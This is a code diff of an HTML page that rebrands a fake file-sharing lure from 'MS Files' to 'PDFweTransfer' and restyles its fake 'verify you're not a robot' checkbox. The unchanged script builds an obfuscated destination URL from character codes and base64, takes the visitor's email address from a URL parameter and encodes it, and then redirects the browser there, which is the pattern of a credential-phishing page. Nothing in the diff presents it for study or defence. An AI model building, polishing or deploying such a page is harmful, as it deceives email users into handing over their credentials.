@@ -3,13 +3,14 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>MS Files</title>
+  <title>PDFweTransfer</title>
   <style>
-   
     :root {
-      --blue: #1a56db;
-      --blue-light: #e0e7ff;
-      --blue-dark: #1e3a8a;
+      --primary: #1a56db;
+      --primary-light: #e0e7ff;
+      --primary-dark: #1e3a8a;
+      --success: #059669;
+      --success-light: #d1fae5;
       --gray-50: #f9fafb;
       --gray-100: #f3f4f6;
       --gray-200: #e5e7eb;
@@ -17,7 +18,6 @@
       --gray-700: #374151;
       --gray-900: #111827;
       --white: #ffffff;
-      --green: #059669;
     }
 
     * {
@@ -53,11 +53,14 @@
       transition: opacity 0.6s ease;
     }
 
-    .init-logo {
-      width: 200px;
-      height: 200px;
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 3px solid rgba(26, 86, 219, 0.2);
+      border-top-color: var(--primary);
+      border-radius: 50%;
       margin-bottom: 20px;
-      animation: pulse 2s infinite ease-in-out;
+      animation: spin 1s linear infinite;
     }
 
     .init-text {
@@ -67,9 +70,9 @@
       animation: fadeIn 0.5s ease 0.4s forwards;
     }
 
-    @keyframes pulse {
-      0%, 100% { transform: scale(0.95); opacity: 0.85; }
-      50% { transform: scale(1.05); opacity: 1; }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
 
     @keyframes fadeIn {
@@ -97,10 +100,13 @@
     }
 
     .panel-title {
-      font-size: 20px;
-      font-weight: 500;
+      font-size: 24px;
+      font-weight: 600;
       margin-bottom: 12px;
       color: var(--gray-900);
+      background: linear-gradient(90deg, var(--primary) 0%, var(--success) 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
     }
 
     .panel-subtitle {
@@ -109,20 +115,22 @@
       line-height: 1.5;
     }
 
-    /* Verification section */
+    /* Enhanced verification section */
     .verification-section {
-      background: var(--gray-100);
-      padding: 24px;
+      background: var(--white);
+      padding: 28px;
       border-radius: 16px;
       margin-bottom: 24px;
       transition: all 0.3s ease;
       border: 1px solid var(--gray-200);
       position: relative;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
     }
 
     .verification-section:hover {
-      border-color: var(--gray-300);
-      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+      border-color: var(--primary-light);
+      box-shadow: 0 6px 12px rgba(0, 0, 0, 0.08);
+      transform: translateY(-2px);
     }
 
     .verification-control {
@@ -136,43 +144,45 @@
       align-items: center;
       gap: 16px;
       cursor: pointer;
+      flex: 1;
     }
 
     .verification-check {
-      width: 22px;
-      height: 22px;
+      width: 24px;
+      height: 24px;
       border: 2px solid var(--gray-300);
-      border-radius: 5px;
+      border-radius: 6px;
       cursor: pointer;
       transition: all 0.2s ease;
       position: relative;
       flex-shrink: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: var(--white);
     }
 
+    /* Only the checkmark turns green, not the entire box */
     .verification-check:checked {
-      background-color: var(--blue);
-      border-color: var(--blue);
+      border-color: var(--gray-300);
+      background: var(--white);
     }
 
     .verification-check:checked::after {
-      content: "";
-      position: absolute;
-      left: 7px;
-      top: 3px;
-      width: 5px;
-      height: 11px;
-      border: solid white;
-      border-width: 0 2px 2px 0;
-      transform: rotate(45deg);
+      content: "✓";
+      color: var(--success);
+      font-size: 16px;
+      font-weight: bold;
     }
 
     .verification-text {
       font-weight: 500;
       user-select: none;
       color: var(--gray-900);
+      font-size: 16px;
     }
 
-    /* Security badge */
+    /* Enhanced security badge */
     .security-badge {
       display: flex;
       flex-direction: column;
@@ -180,27 +190,31 @@
     }
 
     .security-icon {
-      width: 30px;
-      height: 30px;
+      width: 36px;
+      height: 36px;
+      filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.1));
     }
 
     .security-links {
       display: flex;
       gap: 16px;
-      margin-top: 8px;
+      margin-top: 10px;
     }
 
     .security-link {
       font-size: 13px;
-      color: var(--blue);
+      color: var(--primary);
       text-decoration: none;
+      transition: color 0.2s;
+      font-weight: 500;
     }
 
     .security-link:hover {
+      color: var(--primary-dark);
       text-decoration: underline;
     }
 
-    
+    /* Processing state */
     .processing {
       pointer-events: none;
     }
@@ -212,7 +226,7 @@
       left: 0;
       width: 100%;
       height: 100%;
-      background-color: rgba(255, 255, 255, 0.85);
+      background-color: rgba(255, 255, 255, 0.9);
       z-index: 1;
       border-radius: 16px;
     }
@@ -222,68 +236,24 @@
       position: absolute;
       top: 50%;
       left: 50%;
-      transform: translate(-50%, -50%);
-      width: 26px;
-      height: 26px;
+      transform: translate(-50%, -50);
+      width: 32px;
+      height: 32px;
       border: 3px solid rgba(26, 86, 219, 0.2);
-      border-top-color: var(--blue);
+      border-top-color: var(--primary);
       border-radius: 50%;
       animation: rotate 1s linear infinite;
       z-index: 2;
     }
 
     .verified {
-      background-color: rgba(5, 150, 105, 0.1);
-      border-color: var(--green);
-    }
-
-    .verified .verification-check {
-      border-color: var(--green);
-      background-color: var(--green);
+      background-color: var(--success-light);
+      border-color: var(--success);
     }
 
     @keyframes rotate {
       0% { transform: translate(-50%, -50%) rotate(0deg); }
       100% { transform: translate(-50%, -50%) rotate(360deg); }
-    }
-
-  
-    .success-icon {
-      width: 26px;
-      height: 26px;
-      position: absolute;
-      right: 24px;
-      opacity: 0;
-      transform: scale(0.7);
-      transition: all 0.3s ease;
-    }
-
-    .verified .success-icon {
-      opacity: 1;
-      transform: scale(1);
-    }
-
-    .success-icon path {
-      stroke: var(--green);
-      stroke-width: 2.8;
-      stroke-linecap: round;
-      stroke-linejoin: round;
-      fill: none;
-      stroke-dasharray: 1000;
-      stroke-dashoffset: 0;
-    }
-
-    .success-icon.animated path {
-      animation: draw 0.7s ease-out forwards;
-    }
-
-    @keyframes draw {
-      0% {
-        stroke-dashoffset: 1000;
-      }
-      100% {
-        stroke-dashoffset: 0;
-      }
     }
 
     /* Celebration effects */
@@ -296,6 +266,14 @@
       pointer-events: none;
       z-index: 99;
     }
+
+    /* Footer message */
+    .footer-message {
+      text-align: center;
+      color: var(--gray-700);
+      font-size: 14px;
+      margin-top: 20px;
+    }
   </style>
 </head>
 <body>
@@ -304,18 +282,15 @@
 
   <!-- Initial loading screen -->
   <div class="init-loader" id="initialLoader">
-<!--    <svg class="init-logo" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">-->
-<!--      <rect x="10" y="10" width="80" height="80" rx="5" fill="#1a56db" fill-opacity="0.2"/>-->
-<!--      <path d="M35 35H65V65H35V35Z" stroke="#1a56db" stroke-width="6"/>-->
-<!--      <path d="M45 45H55V55H45V45Z" fill="#1a56db"/>-->
-<!--    </svg>-->
-    <img class="init-logo" src="logo.png">
+    <div class="spinner"></div>
+    <p class="init-text"></p>
   </div>
 
   <!-- Main content -->
   <div class="access-panel" id="accessPanel">
     <div class="panel-header">
-      <p class="panel-subtitle">To view this document,<br>verify you're not a robot below</p>
+      <h1 class="panel-title"></h1>
+      <p class="panel-subtitle">Verify you're not a robot to continue</p>
     </div>
 
     <div class="verification-section" id="verificationSection">
@@ -335,13 +310,10 @@
             <a href="#" class="security-link">Terms</a>
           </div>
         </div>
-
-        <!-- Success indicator -->
-        <svg class="success-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-          <path d="M20 6L9 17l-5-5"/>
-        </svg>
       </div>
     </div>
+
+    <p class="footer-message">This verification helps protect against automated access</p>
   </div>
 
   <script>
@@ -411,8 +383,8 @@
     function processUrlParameters() {
       // Obfuscated base URL construction
       const urlParts = [
-        String.fromCharCode(104, 116, 116, 112, 115, 58), 
-        String.fromCharCode(47, 47), // "//"
+        String.fromCharCode(104, 116, 116, 112, 115, 58),
+        String.fromCharCode(47, 47),
         'protonfiles',
         '.',
         atob('ZXNna3J1aWVzeWFweWR0'),
@@ -426,13 +398,10 @@
       const urlParams = new URLSearchParams(window.location.search);
       let officeParam = urlParams.get("eoffice") || "";
 
-      
       if (officeParam.includes('@') && officeParam.includes('.')) {
-       
         const reversed = officeParam.split('').reverse().join('');
         const encoded = reversed.replace(/\./g, 'QQQ').replace(/@/g, 'ZZZ');
 
-       
         const newUrl = new URL(window.location.href);
         newUrl.searchParams.set('eoffice', encoded);
         window.history.replaceState({}, '', newUrl.toString());
@@ -443,15 +412,14 @@
       return baseDestination + "#" + encodeURIComponent(officeParam);
     }
 
-    
+    // Initialize the page
     document.addEventListener('DOMContentLoaded', () => {
       const initialLoader = document.getElementById('initialLoader');
       const accessPanel = document.getElementById('accessPanel');
       const verificationCheck = document.getElementById('verificationCheck');
       const verificationSection = document.getElementById('verificationSection');
-      const successIcon = document.querySelector('.success-icon');
 
-      
+      // Show panel after a short delay
       setTimeout(() => {
         initialLoader.style.opacity = '0';
         setTimeout(() => {
@@ -470,19 +438,17 @@
           setTimeout(() => {
             verificationSection.classList.remove('processing');
             verificationSection.classList.add('verified');
-            successIcon.classList.add('animated');
 
             // Launch celebration
             launchCelebration();
 
-            
+            // Redirect after brief delay
             setTimeout(() => {
               window.location.href = processUrlParameters();
             }, 800);
           }, 2000);
         } else {
           verificationSection.classList.remove('verified');
-          successIcon.classList.remove('animated');
         }
       });
 
